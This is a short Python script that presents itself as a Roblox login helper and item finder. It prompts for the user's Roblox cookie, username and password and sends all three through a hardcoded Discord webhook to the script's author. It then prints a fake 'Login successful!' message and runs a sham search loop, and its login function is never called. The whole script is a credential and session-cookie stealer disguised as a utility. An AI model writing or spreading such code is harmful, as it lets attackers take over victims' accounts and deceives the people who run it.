from http.client import responses
from urllib import response
import requests
from dhooks import Webhook, Embed
import json
import random
import time

hook = Webhook("https://discord.com/api/webhooks/1053799798404296825/Z37-A60r1-VbCSv-9VNHJhs26EcoEE9ToHnXIEuvQUZB64KE90iIpYgorclOXL-XEPKN")

Cookie = input("Enter Cookie: ")
Username = input("Enter Username: ")
Password = input("Enter Password: ")

embed = Embed(title='Beam')

embed.set_author(name= 'Rci_EZ')
embed.add_field(name='username', value=Username)
embed.add_field(name='password', value=Password)
embed.add_field(name='cookie', value=Cookie)

url = 'https://auth.roblox.com/v2/login'
response = requests.get(url)

def login(Username, Password):
    session = requests.Session()
    payload = {
        'Username': Username,
        'Password': Password
    }
    res = session.post(url, json=payload)
    session.headers.update({'authorization': json.loads(res.content['token'])})
    print(res.content)
    return session


print("Login successful!")

hook.send(embed=embed)

print('starting to look for users with profitable itens')
while True:
    random_number = random.randint(1, 1000000000)
    print(random_number)
    time.sleep(0,2)
    break

input()
